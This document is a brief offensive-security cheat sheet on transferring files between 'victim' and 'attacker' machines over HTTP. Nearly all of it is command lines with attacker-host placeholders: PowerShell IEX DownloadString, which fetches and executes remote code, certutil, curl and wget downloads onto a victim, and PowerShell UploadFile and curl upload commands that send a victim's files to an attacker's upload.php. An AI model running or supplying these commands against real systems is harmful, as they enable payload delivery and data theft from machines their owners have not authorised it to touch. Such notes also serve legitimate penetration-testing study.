# There are many ways to transfer files from and to victim and attacker machines: 

## Transfers over HTTP: 

**Download from attacker**
- Set up python server at th e directory we want to serve files at
- Windows: 
	1. `powershell -c IEX(New-Object System.Net.WebClient).DownloadString(<attacker-ip-file-location>)`
	2. `powershell (New-Object System.Net.WebClient).DownloadFile(<attacker-ip-file-location>,<victim-target-file-location>`
	3. `certutil -urlcache -split -f <attacker-ip-file-location> <victim-target-file-location>`
- Linux: 
	1. `curl <attacker-ip-file-location> -o <download-file-location>`
	2. `wget <attacker-ip-file-location> -O <download-file-location>`

**Upload to attacker**
- Turn off python web server
- Turn on apache web server: `service apache2 start`
- Windows:
	- `powershell -c (New-Object System.Net.WebClient).UploadFile(<attacker-ip/upload.php>,'<full-path-file-to-upload>')`
- Linux: 
	- `curl -F 'file=@/full/path/to/the/file' <attacker-ip>/upload.php`
